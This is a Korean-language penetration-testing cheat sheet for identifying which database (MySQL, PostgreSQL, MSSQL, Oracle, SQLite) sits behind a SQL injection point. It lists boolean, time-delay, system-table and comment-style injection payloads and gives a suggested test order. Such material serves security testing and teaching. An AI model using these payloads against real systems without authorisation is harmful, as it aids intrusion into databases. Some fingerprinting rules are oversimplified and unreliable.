## 1. 함수 기반 판별 (Boolean-based)

특정 DBMS에서만 작동하는 고유 함수를 호출하여 페이지가 정상적으로 응답하는지 확인합니다.

### ① 버전 확인 함수

가장 고전적이고 확실한 방법입니다.

* **MySQL / MariaDB:** `AND (SELECT VERSION() LIKE '5%')-- ` (또는 `@@version`)
* **PostgreSQL:** `AND (SELECT VERSION() LIKE 'PostgreSQL%')-- `
* **MSSQL:** `AND (SELECT @@VERSION LIKE 'Microsoft%')-- `
* **Oracle:** `AND (SELECT BANNER FROM V$VERSION WHERE ROWNUM=1) LIKE 'Oracle%'-- `
* **SQLite:** `AND (SELECT sqlite_version() LIKE '3%')-- `

### ② 문자열 연결(Concatenation) 방식

DBMS마다 문자열을 합치는 기호가 다릅니다.

* **MySQL:** `'a' 'b'` (공백으로 연결) 또는 `CONCAT('a','b')`
* **MSSQL:** `'a' + 'b'`
* **Oracle / PostgreSQL:** `'a' || 'b'`

---

## 2. 시간 지연 기반 판별 (Time-based)

Boolean 방식이 막혀있을 때, 서버의 응답 시간을 늦추는 함수를 던져서 반응을 봅니다.

| DBMS | 페이로드 예시 | 특징 |
| --- | --- | --- |
| **MySQL** | `AND SLEEP(5)-- ` | 가장 흔함 |
| **PostgreSQL** | `AND PG_SLEEP(5)-- ` | 함수명이 독특함 |
| **MSSQL** | `WAITFOR DELAY '0:0:5'-- ` | 문자열 형태의 시간 지정 |
| **Oracle** | `AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ` | 권한에 따라 안 될 수도 있음 |

---

## 3. 고유 테이블 존재 여부 확인

특정 DBMS에만 존재하는 시스템 테이블에 쿼리를 날려봅니다.

* **Oracle:** `AND (SELECT 1 FROM DUAL)-- ` (**DUAL** 테이블은 Oracle의 상징입니다.)
* **MSSQL:** `AND (SELECT 1 FROM sys.databases)-- `
* **MySQL:** `AND (SELECT 1 FROM information_schema.tables LIMIT 0,1)-- `
* **SQLite:** `AND (SELECT 1 FROM sqlite_master LIMIT 0,1)-- `

---

## 4. 주석(Comment) 스타일로 좁히기

쿼리의 끝을 어떻게 처리하느냐에 따라서도 DBMS를 유추할 수 있습니다.

* **`#`**: MySQL에서 주로 사용 (URL 인코딩 시 `%23`)
* **`-- `**: 거의 모든 DBMS (뒤에 공백 한 칸 필수)
* **`/* ... */`**: 대부분 지원하지만, `/*! MySQL 전용 구문 */` 같은 특수 문법은 MySQL에서만 동작합니다.

---

## 요약 가이드

보통 다음과 같은 순서로 테스트합니다.

1. `' AND (SELECT 1 FROM DUAL)-- ` $\rightarrow$ 응답 오면 **Oracle**
2. `' AND (SELECT @@version LIKE '%Microsoft%')-- ` $\rightarrow$ 응답 오면 **MSSQL**
3. `' AND SLEEP(5)-- ` $\rightarrow$ 5초 뒤 응답 오면 **MySQL**
4. `' || 'a'='a` $\rightarrow$ 응답 오면 **PostgreSQL** (|| 연산자 확인)
